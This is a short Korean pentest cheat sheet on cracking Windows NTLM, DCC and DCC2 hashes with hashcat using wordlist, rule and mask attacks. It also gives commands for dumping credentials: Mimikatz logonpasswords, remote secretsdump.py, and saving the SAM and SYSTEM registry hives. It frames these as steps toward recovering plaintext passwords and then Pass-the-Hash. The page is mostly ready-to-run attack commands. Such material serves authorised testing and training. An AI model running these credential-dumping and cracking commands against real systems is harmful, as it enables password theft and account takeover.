# Hashcat NTLM (-m 1000)

> 무엇: hashcat -m 1000 Windows NTLM 해시 크래킹 — Mimikatz sekurlsa::logonpasswords, secretsdump.py, SAM+SYSTEM hive로 추출한 해시를 사전·규칙·마스크 공격으로 크래킹, DCC(-m 1100)/DCC2(-m 2100) 포함
> 언제: Windows 로컬·도메인 해시 덤프를 확보해 패스워드 평문을 알아낼 때. 크래킹 성공 후 Pass-the-Hash 등으로 이어감
> 조건: hashcat 설치와 워드리스트(rockyou.txt) — NTLM은 salt가 없어 rainbow table 가능, DCC2는 PBKDF2로 매우 느려 시간 제한 필요

Windows NTLM 해시 크래킹.

## 기본

```bash
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 ntlm.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

## 규칙 적용

```bash
hashcat -m 1000 -a 0 ntlm.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule -w 3 -O
```

## 브루트포스

```bash
# 8자리 영문 소문자
hashcat -m 1000 -a 3 ntlm.txt ?l?l?l?l?l?l?l?l
```

## 해시 추출 (Windows)

```bash
# Mimikatz
sekurlsa::logonpasswords

# secretsdump.py (impacket)
secretsdump.py domain/user:pass@target

# registry hive
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL
```

## Domain Cached Credentials

```bash
# DCC -m 1100
hashcat -m 1100 -a 0 dcc.txt wordlist.txt

# DCC2 -m 2100 (느림)
hashcat -m 2100 -a 0 dcc2.txt wordlist.txt -w 3
```

## 팁

- NTLM은 salt 없음 → rainbow table 가능
- DCC2는 PBKDF2로 매우 느림. 시간 제한 두고 시도